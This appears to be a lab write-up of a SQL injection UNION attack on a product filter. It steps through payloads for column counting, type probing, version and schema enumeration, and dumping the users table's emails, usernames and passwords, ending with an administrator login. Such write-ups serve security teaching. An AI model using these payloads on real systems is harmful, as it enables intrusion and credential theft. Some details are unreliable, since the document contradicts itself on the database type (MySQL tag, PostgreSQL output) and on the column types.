# SQL injection UNION attack, retrieving multiple values in a single column

**Tags:** `UNION attack` · `MySQL` · `information_schema` · `credential extraction`

## 1. Detection

Navigated to `/filter?category=Gifts` and appended a single quote (`'`) to the category value. The server returned an **Internal Server Error**, confirming unsanitized input and likely no prepared statements — the value is wrapped in single quotes in the backend query.

```sql
Gifts' AND 1=1--+   -- results returned
Gifts' AND 1=2--+  -- no results
```

Also the, the database supports `true` and `false` directives, signalling it's a Non-Oracle Database.

## 2. Column count enumeration

Used `ORDER BY` to find the number of columns. Incrementing the index until `ORDER BY 3` threw an error, narrowing it to **2 columns**. The page also visually confirms this by showing only a title and description per item.

Additional payloads:-

```sql
Gifts' UNION SELECT NULL,NULL--+ [ No Error ]
Gifts' UNION SELECT NULL,NULL,NULL--+ [ Internal Server Error]
Gifts' UNION SELECT NULL--+ [ Internal Server Error ]
```

Understanding the data-types returned by the columns.

- Manually checking each column type.
    - Column 1
        - `Gifts' UNION SELECT 1,NULL--+` - **[No Error]**
        - `Gifts' UNION SELECT 1.1,NULL--+` - **[No Error]**
        - `Gifts' UNION SELECT '1.1',NULL--+` - **[Internal Server Error]**
        - Confirm that column 1 is `INTEGER` type.
    - Column 2
        - `Gifts' UNION SELECT NULL,1--+` - **[Internal Server Error]**
        - `Gifts' UNION SELECT NULL,1.1--+` - **[Internal Server Error]**
        - `Gifts' UNION SELECT NULL,'1.1'--+` - **[No Error]**
        - Confirming that column 2 is `STRING` type.
- Therefore, The following types were identified:

| Column   | Data Type |
|----------|-----------|
| Column 1 | INT       |
| Column 2 | VARCHAR   |

## 3. Identifying Database
- I used `version()` function to get the database version string in second column.
- Used the following database.
```sql
Gifts' UNION SELECT NULL,version()--+
```

**Output:**
```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

Further enumeration confirmed the database context:

```sql
Gifts' UNION SELECT NULL,CONCAT(current_database(),':',current_user,':',current_schema())--+
```

**Output:**
```
academy_labs:peter:public
```

## 4. Table and column discovery

Queried `information_schema.tables` to list all user-created base tables in the public schema:

```sql
Gifts' UNION SELECT (SELECT TABLE_NAME),NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--+
```

**Output:**
```
products
users
```

Queried `information_schema.columns` to list all columns in the `users` table:

```sql
Gifts' UNION SELECT NULL,(SELECT COLUMN_NAME) FROM information_schema.columns WHERE table_name='users'--+
```

**Output:**
```
email
username
password
```

## 5. Solving the Lab

Used the following payload to extract the credentials for all users, found `administrator` credentials, logged in to admin account and solved the lab.

```sql
Gifts' UNION SELECT NULL,CONCAT(email,':',username,':',password) FROM users--+
```

**Recovered credentials:**

| Field    | Value                  |
|----------|------------------------|
| Username | `administrator`        |
| Password | `4nn7j0gh4k2cmog5abkw` |

Logged in with these credentials — lab solved.